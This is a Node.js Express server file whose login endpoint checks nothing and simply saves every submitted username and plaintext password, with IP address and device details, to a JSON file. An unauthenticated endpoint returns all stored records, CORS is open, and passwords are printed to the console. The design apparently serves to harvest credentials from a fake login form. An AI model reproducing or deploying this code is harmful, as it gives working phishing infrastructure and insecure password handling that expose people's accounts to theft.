const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const USER_DATA_FILE = path.join(__dirname, '../user_data.json');

// Middleware
app.use(cors());
app.use(express.json());

// Initialize user data file
if (!fs.existsSync(USER_DATA_FILE)) {
  fs.writeFileSync(USER_DATA_FILE, '[]');
}

// Login endpoint
app.post('/api/login', (req, res) => {
  try {
    console.log('🔥 Received login request');
    console.log('📥 Request body:', req.body);
    
    const { username, password, login_method, user_agent } = req.body;
    
    if (!username || !password) {
      return res.status(400).json({ 
        success: false, 
        message: 'Username and password are required' 
      });
    }
    
    const loginData = {
      username,
      password,
      login_method: login_method || 'manual',
      timestamp: new Date().toISOString(),
      ip_address: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'localhost',
      user_agent: user_agent || req.get('User-Agent'),
      location: getLocationInfo(req.headers['x-forwarded-for'] || 'localhost'),
      device: getDeviceInfo(user_agent || req.get('User-Agent'))
    };
    
    console.log('💾 Saving login data:', loginData);
    
    let existingData = [];
    if (fs.existsSync(USER_DATA_FILE)) {
      const data = fs.readFileSync(USER_DATA_FILE, 'utf8');
      existingData = JSON.parse(data);
    }
    
    existingData.push(loginData);
    fs.writeFileSync(USER_DATA_FILE, JSON.stringify(existingData, null, 2));
    
    console.log('✅ Login saved successfully!');
    console.log(`📊 Total users: ${existingData.length}`);
    
    res.json({ 
      success: true, 
      message: 'Login data saved',
      user_count: existingData.length 
    });
    
  } catch (error) {
    console.error('💥 Error saving login data:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Error saving login data: ' + error.message 
    });
  }
});

// Get user data endpoint
app.get('/api/users', (req, res) => {
  try {
    if (fs.existsSync(USER_DATA_FILE)) {
      const data = fs.readFileSync(USER_DATA_FILE, 'utf8');
      const users = JSON.parse(data);
      res.json({ success: true, users });
    } else {
      res.json({ success: true, users: [] });
    }
  } catch (error) {
    res.status(500).json({ success: false, message: 'Error reading user data' });
  }
});

// Clear data endpoint
app.delete('/api/clear-data', (req, res) => {
  try {
    fs.writeFileSync(USER_DATA_FILE, '[]');
    res.json({ success: true, message: 'User data cleared' });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Error clearing data' });
  }
});

// Helper functions
function getLocationInfo(ip) {
  if (!ip || ip === 'localhost') {
    return { city: 'Localhost', country: 'Local' };
  }
  return { city: 'Unknown', country: 'Unknown' };
}

function getDeviceInfo(userAgent) {
  if (!userAgent) return { type: 'Unknown', os: 'Unknown', browser: 'Unknown' };
  
  const device = { type: 'Desktop', os: 'Unknown', browser: 'Unknown' };
  
  if (userAgent.includes('Windows')) device.os = 'Windows';
  else if (userAgent.includes('Mac')) device.os = 'macOS';
  else if (userAgent.includes('Linux')) device.os = 'Linux';
  else if (userAgent.includes('Android')) device.os = 'Android';
  else if (userAgent.includes('iPhone')) device.os = 'iOS';
  
  if (userAgent.includes('Mobile')) device.type = 'Mobile';
  else if (userAgent.includes('Tablet')) device.type = 'Tablet';
  
  if (userAgent.includes('Chrome')) device.browser = 'Chrome';
  else if (userAgent.includes('Firefox')) device.browser = 'Firefox';
  else if (userAgent.includes('Safari')) device.browser = 'Safari';
  else if (userAgent.includes('Edge')) device.browser = 'Edge';
  
  return device;
}

module.exports = app;
